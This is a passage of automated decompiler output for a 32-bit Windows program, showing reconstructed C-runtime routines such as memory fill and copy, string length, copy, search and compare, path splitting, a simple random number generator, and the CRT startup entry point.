				if (ecx_140->dw0004 > 0x00)
				{
					do
					{
						Mem175[eax_107 + esi_121:byte] = Mem106[eax_107 + esi_121:byte] & 0x00;
						esi_121 = esi_121 + 0x01;
						edx_159 = edx_159 + 0x01;
					} while (edx_159 < ecx_140->dw0004);
				}
				ecx_140 = ecx_140 + 0x01;
				ebx_109 = ebx_109 - 0x01;
			} while (ebx_109 != 0x00);
		}
		Eq_4914 ecx_126[] = dwLoc08_101;
		if (dwLoc08_101 < eax_89 + ~0x03)
		{
			word32 esi_130 = esi_121 + eax_107 + eax_107;
			do
			{
				*esi_130 = (byte) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&ecx_126[edi_108].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
				esi_130 = esi_130 + 0x01;
				ecx_126 = (Eq_4914 (*)[]) (ecx_126 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
			} while (ecx_126 < eax_89 + ~0x03);
		}
	}
	return eax_107;
	word32 ebp_61;
	*ebpOut = *ebp;
	return eax_107;
}

// 00407310: Register byte fn00407310(Stack Eq_11 dwArg04, Stack byte bArg08, Stack Eq_15 dwArg0C)
byte fn00407310(Eq_11 dwArg04, byte bArg08, Eq_15 dwArg0C)
{
	uint32 edx_3 = dwArg0C;
	byte dl_4 = (byte) dwArg0C;
	if (dwArg0C == 0x00)
		return dl_4;
	byte dl_36;
	byte al_24 = bArg08;
	ui32 eax_25 = (word32) bArg08;
	byte * edi_29 = dwArg04;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_56 = -dwArg04;
		ui32 ecx_57 = ecx_56 & 0x03;
		if ((ecx_56 & 0x03) != 0x00)
		{
			edx_3 = dwArg0C - (ecx_56 & 0x03);
			do
			{
				*edi_29 = bArg08;
				edi_29 = edi_29 + 0x01;
				ecx_57 = ecx_57 - 0x01;
			} while (ecx_57 != 0x00);
		}
		Eq_4978 eax_69 = eax_25 * 0x01010000 + eax_25 * 0x0101;
		edx_3 = edx_3 & 0x03;
		al_24 = (byte) eax_69;
		dl_36 = (byte) edx_3;
		uint32 ecx_74 = edx_3 >> 0x02;
		if (ecx_74 != 0x00)
		{
			while (ecx_74 != 0x00)
			{
				*edi_29 = (byte) eax_69;
				edi_29 = edi_29 + 0x04;
				ecx_74 = ecx_74 - 0x01;
			}
			if (edx_3 == 0x00)
				return dl_36;
		}
	}
	do
	{
		*edi_29 = al_24;
		edx_3 = edx_3 - 0x01;
		edi_29 = edi_29 + 0x01;
		dl_36 = (byte) edx_3;
	} while (edx_3 != 0x00);
	return dl_36;
}

// 00407370: Register word32 fn00407370(Stack Eq_11 dwArg04, Register out (ptr byte) ediOut)
word32 fn00407370(Eq_11 dwArg04, byte * & ediOut)
{
	word32 edi_7;
	return fn004073E1(dwArg04, out edi_7);
}

// 00407380: void fn00407380(Stack Eq_11 dwArg04)
void fn00407380(Eq_11 dwArg04)
{
	union Eq_5024 * ecx_28 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		while (true)
		{
			ecx_28 = (union Eq_5024 *) ((char *) ecx_28 + 0x01);
			if (*ecx_28 == 0x00)
				break;
			if ((ecx_28 & 0x03) == 0x00)
				goto l0040739C;
		}
	}
	else
	{
l0040739C:
		do
		{
			word32 eax_36 = *ecx_28;
			ecx_28 = (union Eq_5024 *) ((char *) ecx_28 + 0x04);
		} while (((eax_36 ^ ~0x00 ^ eax_36 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_45 = *(ecx_28 - 0x04);
		byte ah_47 = SLICE(eax_45, byte, 8);
		if ((byte) eax_45 == 0x00)
		{
			word32 edi_67;
			fn004073E1(ecx_28 - 0x04, out edi_67);
			return;
		}
		if (ah_47 == 0x00)
		{
			word32 edi_64;
			fn004073E1(ecx_28 - 0x03, out edi_64);
			return;
		}
		if ((eax_45 & 0x00FF0000) == 0x00)
		{
			word32 edi_61;
			fn004073E1(ecx_28 - 0x02, out edi_61);
			return;
		}
		if ((eax_45 & 0xFF000000) != 0x00)
			goto l0040739C;
	}
	struct Eq_5019 * edi_29 = ecx_28 - 0x01;
	word32 edi_30;
	fn004073E1(edi_29, out edi_30);
	return;
}

// 004073E1: Register (ptr byte) fn004073E1(Register (ptr Eq_5019) edi, Register out ptr32 ediOut)
byte * fn004073E1(Eq_5019 * edi, ptr32 & ediOut)
{
fn004073E1_entry:
	byte dl_25
	byte * ecx_28 = v3->ptr000C
	branch (ecx_28 & 0x03) == 0x00 l00407406
	goto l004073ED
l004073E1:
l004073ED:
	dl_25 = *ecx_28
	ecx_28 = ecx_28 + 0x01
	branch dl_25 == 0x00 l00407458
l004073F4:
	edi->b0000 = dl_25
	edi = edi + 0x01
	branch (ecx_28 & 0x03) != 0x00 l004073ED
	goto l00407406
l00407401:
	edi->b0000 = (byte) edx_46
	edi = edi + 0x04
l00407406:
	Eq_5129 edx_46 = *ecx_28
	Eq_5133 eax_42 = *ecx_28
	dl_25 = (byte) edx_46
	byte dh_48 = SLICE(edx_46, byte, 8)
	Eq_5140 dx_49 = (word16) edx_46
	ecx_28 = ecx_28 + 0x04
	branch ((eax_42 ^ ~0x00 ^ (word32) eax_42 + 0x7EFEFEFF) & 0x81010100) == 0x00 l00407401
l00407420:
	branch dl_25 == 0x00 l00407458
l00407424:
	branch dh_48 == 0x00 l0040744F
l00407428:
	branch (edx_46 & 0x00FF0000) == 0x00 l00407442
l00407430:
	branch (edx_46 & 0xFF000000) == 0x00 l0040743A
	goto l00407401
l0040743A:
	edi->b0000 = (byte) edx_46
	word32 edi_74
	*ediOut = v3->dw0000
	return ecx_28
l00407442:
	edi->b0000 = (byte) dx_49
	edi[0x02] = (struct Eq_5019) 0x00
	word32 edi_79
	*ediOut = v3->dw0000
	return ecx_28
l0040744F:
	edi->b0000 = (byte) dx_49
	word32 edi_83
	*ediOut = v3->dw0000
	return ecx_28
l00407458:
	edi->b0000 = dl_25
	word32 edi_36
	*ediOut = v3->dw0000
	return ecx_28
fn004073E1_exit:
}

// 00407460: Register ptr32 fn00407460(Stack Eq_11 dwArg04, Register out Eq_12 dlOut)
ptr32 fn00407460(Eq_11 dwArg04, Eq_12 & dlOut)
{
	*dlOut = dl;
	union Eq_5209 * ecx_27 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		while (true)
		{
			ecx_27 = (union Eq_5209 *) ((char *) ecx_27 + 0x01);
			if (*ecx_27 == 0x00)
				break;
			if ((ecx_27 & 0x03) == 0x00)
				goto l00407480;
		}
	}
	else
	{
l00407480:
		do
		{
			word32 eax_39 = *ecx_27;
			byte dl_42 = (byte) (eax_39 + 0x7EFEFEFF);
			*dlOut = dl_42;
			ecx_27 = (union Eq_5209 *) ((char *) ecx_27 + 0x04);
		} while (((eax_39 ^ ~0x00 ^ eax_39 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_49 = *(ecx_27 - 0x04);
		byte ah_51 = SLICE(eax_49, byte, 8);
		if ((byte) eax_49 == 0x00)
			return ecx_27 - 0x04 - dwArg04;
		if (ah_51 == 0x00)
			return ecx_27 - 0x03 - dwArg04;
		if ((eax_49 & 0x00FF0000) == 0x00)
			return ecx_27 - 0x02 - dwArg04;
		if ((eax_49 & 0xFF000000) != 0x00)
			goto l00407480;
	}
	return ecx_27 - 0x01 - dwArg04;
}

// 004074DB: Register Eq_11 fn004074DB(Register Eq_11 ecx, Register ptr32 ebp, Register (ptr (arr Eq_5457)) edi, Stack Eq_11 dwArg04, Stack ptr32 dwArg08)
Eq_11 fn004074DB(Eq_11 ecx, ptr32 ebp, Eq_5457 * edi[], Eq_11 dwArg04, ptr32 dwArg08)
{
	Eq_11 ebx_17 = dwArg04;
	Eq_11 ecx_108 = dwArg04;
	byte dl_26;
	if (fn00407460(dwArg04, out dl_26) >= 0x01 && *((word32) dwArg04 + 0x01) == 0x3A)
	{
		if (dwArg08 != null)
		{
			ecx_108 = fn00408597(edi, dwArg08, dwArg04, (struct Eq_5287 *) 0x02, out ebx_17);
			dwArg08->b0002 = dwArg08->b0002 & 0x00;
		}
		ebx_17 = (word32) ebx_17 + 0x02;
	}
	else if (dwArg08 != null)
		dwArg08->b0000 = dwArg08->b0000 & 0x00;
	fp->t0008 = fp->t0008 & 0x00;
	fp->t0004 = ebx_17;
	Eq_11 eax_120 = (word32) ebx_17 + 0x01;
	Eq_5554 (* esi_115)[] = (Eq_5554 (*)[]) 0xFF;
	if (*ebx_17 != 0x00)
	{
		do
		{
			byte cl_188 = *eax_120;
			ecx_108 = DPB(ecx_108, cl_188, 0);
			if ((((word32) cl_188)->b4932E1 & 0x04) != 0x00)
				eax_120 = (word32) eax_120 + 0x01;
			else if (cl_188 != 0x2F && cl_188 != 0x5C)
			{
				if (cl_188 == 0x2E)
					*(fp - 0x08) = (union Eq_11 *) eax_120;
			}
			else
			{
				ecx_108 = eax_120;
				fp->t0008 = ecx_108;
			}
			eax_120 = (word32) eax_120 + 0x01;
		} while (*eax_120 != 0x00);
		Eq_11 edi_201 = fp->t0008;
		fp->t0004 = eax_120;
		if (edi_201 != 0x00)
		{
			if (fp->t000C != 0x00)
			{
				Eq_5457 (* edi_217)[] = edi_201 - ebx_17;
				if (edi_217 >= (Eq_5457 (*)[]) 0xFF)
					edi_217 = (Eq_5457 (*)[]) 0xFF;
				*(fp - 0x18) = (Eq_5457 (**)[]) edi_217;
				*(fp - 0x1C) = (union Eq_11 *) ebx_17;
				*(fp - 0x20) = (union Eq_11 *) fp->t000C;
				word32 ebx_228;
				ecx_108 = fn00408597(edi_217, dwArg00, dwArg04, dwArg08, out ebx_228);
				Eq_11 eax_231 = fp->t000C;
				Mem234[edi_217 + eax_231:byte] = Mem227[edi_217 + eax_231:byte] & 0x00;
				eax_120 = fp->t0004;
			}
			ebx_17 = fp->t0008;
l004075A2:
			Eq_11 edi_56 = *(fp - 0x08);
			if (edi_56 != 0x00 && edi_56 >= ebx_17)
			{
				if (fp->ptr0010 != null)
				{
					Eq_5457 (* edi_150)[] = edi_56 - ebx_17;
					if (edi_150 >= (Eq_5457 (*)[]) 0xFF)
						edi_150 = (Eq_5457 (*)[]) 0xFF;
					*(fp - 0x18) = (Eq_5457 (**)[]) edi_150;
					*(fp - 0x1C) = (union Eq_11 *) ebx_17;
					*(fp - 0x20) = (Eq_5457 (**)[]) fp->ptr0010;
					word32 ebx_161;
					ecx_108 = fn00408597(edi_150, dwArg00, dwArg04, dwArg08, out ebx_161);
					Eq_5457 (* eax_164)[] = fp->ptr0010;
					Mem167[edi_150 + eax_164:byte] = Mem160[edi_150 + eax_164:byte] & 0x00;
					eax_120 = fp->t0004;
				}
				Eq_5457 (* edi_126)[] = fp->ptr0014;
				if (edi_126 != null)
				{
					Eq_5554 (* eax_130)[] = eax_120 - *(fp - 0x08);
					if (eax_130 < (Eq_5554 (*)[]) 0xFF)
						esi_115 = eax_130;
					*(fp - 0x18) = (Eq_5554 (**)[]) esi_115;
					*(fp - 0x1C) = *(fp - 0x08);
					*(fp - 0x20) = (Eq_5457 (**)[]) edi_126;
					word32 ebx_141;
					ecx_108 = fn00408597(edi_126, dwArg00, dwArg04, dwArg08, out ebx_141);
					Mem146[esi_115 + edi_126:byte] = Mem140[esi_115 + edi_126:byte] & 0x00;
				}
			}
			else
			{
				Eq_5457 (* edi_77)[] = fp->ptr0010;
				if (edi_77 != null)
				{
					Eq_5554 (* eax_95)[] = eax_120 - ebx_17;
					if (eax_95 < (Eq_5554 (*)[]) 0xFF)
						esi_115 = eax_95;
					*(fp - 0x18) = (Eq_5554 (**)[]) esi_115;
					*(fp - 0x1C) = (union Eq_11 *) ebx_17;
					*(fp - 0x20) = (Eq_5457 (**)[]) edi_77;
					word32 ebx_107;
					ecx_108 = fn00408597(edi_77, dwArg00, dwArg04, dwArg08, out ebx_107);
					Mem112[esi_115 + edi_77:byte] = Mem104[esi_115 + edi_77:byte] & 0x00;
				}
				Eq_5457 eax_87[] = fp->ptr0014;
				if (eax_87 != null)
					eax_87[0x00] = eax_87[0x00] & 0x00;
			}
			return ecx_108;
		}
	}
	ecx_108 = fp->t000C;
	if (ecx_108 != 0x00)
		*ecx_108 = *ecx_108 & 0x00;
	goto l004075A2;
}

// 004076EE: Register int32 fn004076EE(Register Eq_11 ecx, Stack Eq_5606 dwArg04, Stack byte bArg05, Stack byte bArg06, Register out ptr32 ecxOut, Register out Eq_5610 dlOut)
int32 fn004076EE(Eq_11 ecx, Eq_5606 dwArg04, byte bArg05, byte bArg06, ptr32 & ecxOut, Eq_5610 & dlOut)
{
	*ecxOut = ecx;
	*dlOut = dl;
	int32 eax_112;
	if (globals->t491ED4 == 0x00)
	{
		eax_112 = dwArg04;
		if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
			eax_112 = dwArg04 + 0x20;
		return eax_112;
	}
	if (dwArg04 < 0x0100)
	{
		ui32 eax_198;
		if (globals->dw4113BC > 0x01)
		{
			byte dl_209;
			eax_198 = fn00408870(dwArg04, SLICE(dwArg04, word16, 16), 0x01, out dl_209);
			word32 ecx_214;
			*ecxOut = 0x01;
		}
		else
		{
			Eq_12848 eax_216[] = globals->ptr4111B0;
			eax_198 = DPB(eax_216, eax_216[dwArg04].t0000, 0) & 0x01;
		}
		if (eax_198 == 0x00)
		{
l0040774B:
			eax_112 = dwArg04;
			return eax_112;
		}
	}
	word32 eax_131;
	if ((globals->ptr4111B0[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
		eax_131 = 0x02;
	else
		eax_131 = 0x01;
	word32 ecx_152;
	byte dl_153;
	Eq_11 eax_154 = fn00408621(fp - 0x04, globals->t491ED4, (byte *) 0x0100, 0x01, fp + 0x04, eax_131, fp - 0x08, 0x03, 0x00, 0x01, out ecx_152, out dl_153);
	if (eax_154 != 0x00)
	{
		if (eax_154 == 0x01)
			eax_112 = (word32) bLoc08;
		else
		{
			ui32 ecx_167 = (word32) bLoc08;
			*ecxOut = ecx_167;
			eax_112 = (word32) bLoc07 << 0x08 | ecx_167;
		}
		return eax_112;
	}
	goto l0040774B;
}

// 0040780B: Register Eq_11 fn0040780B(Register Eq_11 ebp, Stack Eq_11 dwArg04, Register out ptr32 ediOut)
Eq_11 fn0040780B(Eq_11 ebp, Eq_11 dwArg04, ptr32 & ediOut)
{
	Eq_11 ebp_7;
	word32 edi_8;
	fn00409204(ebp, dwArg04, out ebp_7, out edi_8);
	return ebp_7;
}

// 00407820: Register word32 fn00407820(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08, Stack word32 dwArg0C, Register out ptr32 esiOut, Register out Eq_3384 ediOut)
word32 fn00407820(Eq_11 dwArg04, Eq_11 dwArg08, word32 dwArg0C, ptr32 & esiOut, Eq_3384 & ediOut)
{
	word32 * esi_13 = dwArg08;
	word32 * edi_17 = dwArg04;
	word32 * eax_20 = dwArg08 + dwArg0C;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				word32 esp_85;
				word32 ebp_86;
				word32 edi_87;
				word32 esi_88;
				word32 ecx_89;
				word32 eax_90;
				word32 edx_91;
				byte SCZO_92;
				byte CZ_93;
				byte C_94;
				byte SZO_95;
				byte Z_96;
				byte D_97;
				(*((char *) globals->a407978 + (dwArg0C - 0x04) * 0x04))();
				return ebp_86;
			}
			else
			{
				word32 esp_72;
				word32 ebp_73;
				word32 edi_74;
				word32 esi_75;
				word32 ecx_76;
				word32 eax_77;
				word32 edx_78;
				byte SCZO_79;
				byte CZ_80;
				byte C_81;
				byte SZO_82;
				byte Z_83;
				byte D_84;
				(*((char *) globals->a407880 + (dwArg04 & 0x03) * 0x04))();
				return ebp_73;
			}
		}
		else
		{
			uint32 ecx_42 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C & 0x03)
					;
			}
			else
			{
				while (ecx_42 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = esi_13 + 0x01;
					edi_17 = edi_17 + 0x01;
					ecx_42 = ecx_42 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_48;
					*esiOut = esi;
					word32 edi_50;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_100 = dwArg08 + (dwArg0C - 0x04);
		word32 * edi_101 = dwArg04 + (dwArg0C - 0x04);
		if ((edi_101 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_154;
				word32 ebp_155;
				word32 edi_156;
				word32 esi_157;
				word32 ecx_158;
				word32 eax_159;
				word32 edx_160;
				byte SCZO_161;
				byte CZ_162;
				byte C_163;
				byte SZO_164;
				byte Z_165;
				byte D_166;
				(*((char *) globals->a407A08 + (edi_101 & 0x03) * 0x04))();
				return ebp_155;
			}
		}
		else
		{
			uint32 ecx_117 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_131 = -(dwArg0C >> 0x02);
				word32 esp_134;
				word32 ebp_135;
				word32 edi_136;
				word32 esi_137;
				word32 ecx_138;
				word32 eax_139;
				word32 edx_140;
				byte SCZO_141;
				byte CZ_142;
				byte C_143;
				byte SZO_144;
				byte Z_145;
				byte D_146;
				(*((char *) globals->a407AB0 + ecx_131 * 0x04))();
				return ebp_135;
			}
			else
			{
				while (ecx_117 != 0x00)
				{
					*edi_101 = *esi_100;
					esi_100 = esi_100 - 0x04;
					edi_101 = edi_101 - 0x04;
					ecx_117 = ecx_117 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_111;
					*esiOut = esi;
					word32 edi_113;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
}

// 00407B55: void fn00407B55(Stack Eq_15 dwArg04)
void fn00407B55(Eq_15 dwArg04)
{
	globals->dw4110A0 = dwArg04;
	return;
}

// 00407B5F: Register ui32 fn00407B5F()
ui32 fn00407B5F()
{
	int32 eax_5 = globals->dw4110A0 *s 0x000343FD + 2531011;
	globals->dw4110A0 = eax_5;
	return eax_5 >> 0x10 & 0x7FFF;
}

// 00407B80: void fn00407B80(Register uint32 eax, Stack ptr32 dwArg00)
void fn00407B80(uint32 eax, ptr32 dwArg00)
{
	ptr32 ecx_10 = fp + 0x04;
	if (eax >= 0x1000)
	{
		do
		{
			ecx_10 = ecx_10 - 0x1000;
			eax = eax - 0x1000;
		} while (eax >= 0x1000);
	}
	*(ecx_10 - eax - 0x04) = dwArg00;
	return;
}

// 00407BAF: Register word32 fn00407BAF(Stack Eq_11 dwArg04)
word32 fn00407BAF(Eq_11 dwArg04)
{
	return fn00409245(dwArg04);
}

// 00407C00: Register word32 fn00407C00(Stack word32 dwArg04, Stack Eq_261 dwArg08, Stack Eq_5944 dwArg0C, Register out Eq_5945 esiOut)
word32 fn00407C00(word32 dwArg04, Eq_261 dwArg08, Eq_5944 dwArg0C, Eq_5945 & esiOut)
{
	word32 * esi_13 = dwArg08;
	word32 * edi_17 = dwArg04;
	word32 * eax_20 = dwArg08 + dwArg0C;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				word32 esp_84;
				word32 ebp_85;
				word32 edi_86;
				word32 esi_87;
				word32 ecx_88;
				word32 eax_89;
				word32 edx_90;
				byte SCZO_91;
				byte CZ_92;
				byte C_93;
				byte SZO_94;
				byte Z_95;
				byte D_96;
				(*((char *) globals->a407D58 + (dwArg0C - 0x04) * 0x04))();
				return ebp_85;
			}
			else
			{
				word32 esp_71;
				word32 ebp_72;
				word32 edi_73;
				word32 esi_74;
				word32 ecx_75;
				word32 eax_76;
				word32 edx_77;
				byte SCZO_78;
				byte CZ_79;
				byte C_80;
				byte SZO_81;
				byte Z_82;
				byte D_83;
				(*((char *) globals->a407C60 + (dwArg04 & 0x03) * 0x04))();
				return ebp_72;
			}
		}
		else
		{
			uint32 ecx_41 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C & 0x03)
					;
			}
			else
			{
				while (ecx_41 != 0x00)
				{
					*edi_17 = *esi_13;
					esi_13 = esi_13 + 0x01;
					edi_17 = edi_17 + 0x01;
					ecx_41 = ecx_41 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_47;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_121 = dwArg08 + (dwArg0C - 0x04);
		word32 * edi_100 = dwArg04 + (dwArg0C - 0x04);
		if ((edi_100 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_153;
				word32 ebp_154;
				word32 edi_155;
				word32 esi_156;
				word32 ecx_157;
				word32 eax_158;
				word32 edx_159;
				byte SCZO_160;
				byte CZ_161;
				byte C_162;
				byte SZO_163;
				byte Z_164;
				byte D_165;
				(*((char *) globals->a407DE8 + (edi_100 & 0x03) * 0x04))();
				return ebp_154;
			}
		}
		else
		{
			uint32 ecx_116 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_130 = -(dwArg0C >> 0x02);
				word32 esp_133;
				word32 ebp_134;
				word32 edi_135;
				word32 esi_136;
				word32 ecx_137;
				word32 eax_138;
				word32 edx_139;
				byte SCZO_140;
				byte CZ_141;
				byte C_142;
				byte SZO_143;
				byte Z_144;
				byte D_145;
				(*((char *) globals->a407E90 + ecx_130 * 0x04))();
				return ebp_134;
			}
			else
			{
				while (ecx_116 != 0x00)
				{
					*edi_100 = *esi_121;
					esi_121 = esi_121 - 0x04;
					edi_100 = edi_100 - 0x04;
					ecx_116 = ecx_116 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_110;
					*esiOut = esi;
					return ebp;
				}
			}
		}
	}
}

// 00407FC0: Register (ptr byte) fn00407FC0(Stack Eq_11 dwArg04, Stack word32 dwArg08)
byte * fn00407FC0(Eq_11 dwArg04, word32 dwArg08)
{
fn00407FC0_entry:
	byte dl_15 = dwArg08->b0000
	byte * edi_19 = dwArg04
	branch dl_15 == 0x00 l0040803A
	goto l00407FD1
l00407FC0:
l00407FD1:
	byte dh_43 = dwArg08->b0001
	branch dh_43 == 0x00 l00408027
l00407FD8:
	byte al_128
	struct Eq_6105 * ecx_122 = dwArg08
	byte al_58 = *edi_19
	union Eq_6127 * esi_126 = edi_19 + 0x01
	branch al_58 == dl_15 l00407FFA
l00407FE5:
	branch al_58 == 0x00 l00407FF4
l00407FE9:
	al_128 = (byte) *esi_126
	esi_126 = (union Eq_6127 *) ((char *) esi_126 + 0x01)
l00407FEC:
	branch al_128 == dl_15 l00407FFA
l00407FF0:
	branch al_128 != 0x00 l00407FE9
l00407FF4:
	return null
l00407FFA:
	al_128 = (byte) *esi_126
	esi_126 = (union Eq_6127 *) ((char *) esi_126 + 0x01)
	branch al_128 != dh_43 l00407FEC
l00408001:
	edi_19 = esi_126 - 0x01
	esi_112 = esi_126
l00408004:
	union Eq_6127 * esi_112
	byte ah_93 = ecx_122[0x01]
	branch ah_93 == 0x00 l00408033
l0040800B:
	esi_112 = (union Eq_6127 *) ((char *) esi_112 + 0x02)
	branch *esi_112 != ah_93 l00407FD8
l00408014:
	byte al_115 = ecx_122->b0003
	branch al_115 == 0x00 l00408033
l0040801B:
	ecx_122 = ecx_122 + 0x01
	branch al_115 == *(esi_112 - 0x01) l00408004
	goto l00407FD8
l00408027:
	ui32 eax_159 = (word32) dl_15
	byte bl_163 = (byte) eax_159
	byte * edx_167 = dwArg04
	branch (dwArg04 & 0x03) == 0x00 l00409D9B
	goto l00409D88
l00408033:
	return esi_126 - 0x02
l0040803A:
	return dwArg04
l00409D60:
	return edx_167 - 0x01
l00409D76:
l00409D88:
	byte cl_324 = *edx_167
	edx_167 = edx_167 + 0x01
	branch cl_324 == bl_163 l00409D60
l00409D8F:
	branch cl_324 == 0x00 l00409DE4
l00409D93:
	branch (edx_167 & 0x03) != 0x00 l00409D88
l00409D9B:
	ui32 ebx_200 = eax_159 | eax_159 << 0x08
	ui32 ebx_207 = ebx_200 << 0x10 | ebx_200
	byte bl_208 = (byte) ebx_207
l00409DA6:
	Eq_6228 ecx_213 = *edx_167
	ui32 ecx_217 = ecx_213 ^ ebx_207
	ui32 eax_223 = ecx_213 ^ ~0x00 ^ (word32) ecx_213 + 0x7EFEFEFF
	edx_167 = edx_167 + 0x04
	branch ((ecx_217 ^ ~0x00 ^ ecx_217 + 0x7EFEFEFF) & 0x81010100) != 0x00 l00409DE8
l00409DCC:
	branch (eax_223 & 0x81010100) == 0x00 || ((eax_223 & 0x81010100) & 0x01010100) == 0x00 && ((word32) ecx_213 + 0x7EFEFEFF & 0x80000000) != 0x00 l00409DA6
	goto l00409DE2
l00409DD3:
l00409DDA:
l00409DE2:
l00409DE4:
	return null
l00409DE8:
	uint32 eax_258 = *(edx_167 - 0x04)
	byte al_259 = (byte) eax_258
	byte ah_260 = SLICE(eax_258, byte, 8)
	branch al_259 == bl_208 l00409E25
l00409DEF:
	branch al_259 == 0x00 l00409DE2
l00409DF3:
	branch ah_260 == bl_208 l00409E1E
l00409DF7:
	branch ah_260 == 0x00 l00409DE2
l00409DFB:
	byte al_272 = (byte) (eax_258 >> 0x10)
	byte ah_273 = SLICE(eax_258 >> 0x10, byte, 8)
	branch al_272 == bl_208 l00409E17
l00409E02:
	branch al_272 == 0x00 l00409DE2
l00409E06:
	branch ah_273 == bl_208 l00409E10
l00409E0A:
	branch ah_273 == 0x00 l00409DE2
	goto l00409DA6
l00409E10:
	return edx_167 - 0x01
l00409E17:
	return edx_167 - 0x02
l00409E1E:
	return edx_167 - 0x03
l00409E25:
	return edx_167 - 0x04
fn00407FC0_exit:
}

// 00408040: Register word32 fn00408040(Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack Eq_15 dwArg0C)
word32 fn00408040(Eq_11 dwArg04, word32 dwArg08, Eq_15 dwArg0C)
{
	word32 ecx_16 = dwArg0C;
	if (dwArg0C != 0x00)
	{
		byte * edi_40 = dwArg04;
		if (ecx_16 != 0x00)
		{
			edi_40 = edi_88 + 0x01;
			ecx_16 = ecx_16 - 0x01;
			byte * edi_88 = edi_40;
			if (0x00 == *edi_88)
				goto l00408054;
		}
		word32 ecx_53 = -ecx_16 + dwArg0C;
		byte * edi_55 = dwArg04;
		byte * esi_57 = dwArg08;
		if (ecx_53 != 0x00)
		{
			esi_57 = esi_57 + 0x01;
			edi_55 = edi_55 + 0x01;
			ecx_53 = ecx_53 - 0x01;
			if (*esi_57 != *edi_55)
				goto l0040805F;
		}
		cu8 al_66 = *(esi_57 - 0x01);
		ecx_16 = 0x00;
		if (al_66 > *(edi_55 - 0x01))
		{
l0040806F:
			ecx_16 = ~ecx_16;
			return ecx_16;
		}
		if (al_66 != *(edi_55 - 0x01))
		{
			ecx_16 = ~0x01;
			goto l0040806F;
		}
	}
	return ecx_16;
}

// 00408078: Register Eq_15 Win32CrtStartup()
Eq_15 Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	Eq_15 eax_29 = GetVersion();
	word32 edx_33 = (word32) SLICE(eax_29, byte, 8);
	globals->dw491F04 = edx_33;
	globals->dw491F00 = eax_29 & 0xFF;
	globals->dw491EFC = ((eax_29 & 0xFF) << 0x08) + edx_33;
	globals->dw491EF8 = eax_29 >> 0x10;
	if (fn0040A6ED(0x00) == 0x00)
		fn00408193(fp - 0x04, edi);
	word32 eax_112;
	ui32 ecx_57 = fn0040A542(fp - 0x04, edi);
	globals->t4933E8 = GetCommandLineA();
	globals->t491EB8 = fn0040A410(ecx_57);
	ptr32 ebp_63 = fn0040A10A(fn0040A1C3(ecx_57, fp - 0x04), fp - 0x04);
	word32 esi_64 = fn00409E2C();
	*(ebp_63 - 0x30) = esi_64;
	*(fp - 0x7C) = ebp_63 - 0x5C;
	GetStartupInfoA(*(fp - 0x7C));
	*(ebp_63 - 100) = fn0040A0B2();
	if ((*(ebp_63 - 0x30) & 0x01) != 0x00)
		eax_112 = (word32) *(ebp_63 - 44);
	else
	{
		*(fp - 0x7C) = 0x0A;
		eax_112 = *(fp - 0x7C);
	}
	*(fp - 0x7C) = eax_112;
	*(fp - 0x80) = *(ebp_63 - 100);
	*(fp - 0x84) = esi_64;
	*(fp - 0x88) = esi_64;
	*(fp - 0x88) = (HMODULE *) GetModuleHandleA(*(fp - 0x88));
	word32 edi_91;
	word32 eax_92 = fn0040700C(ebp_63, out edi_91);
	*(ebp_63 - 0x60) = eax_92;
	*(fp - 0x7C) = eax_92;
	fn00409E59(edi_91, dwArg00);
	word32 ** eax_98 = *(ebp_63 - 0x14);
	word32 ecx_100 = **eax_98;
	*(ebp_63 - 0x68) = ecx_100;
	*(fp - 0x80) = eax_98;
	*(fp - 0x84) = ecx_100;
	return fn00409F2E(dwArg00, dwArg04);
}

// 0040816E: Register word32 fn0040816E(Register Eq_11 ebp, Register Eq_11 edi, Register out (ptr word32) esiOut, Register out (ptr byte) ediOut)
word32 fn0040816E(Eq_11 ebp, Eq_11 edi, word32 * & esiOut, byte * & ediOut)
{
	if (globals->dw491EC0 == 0x01)
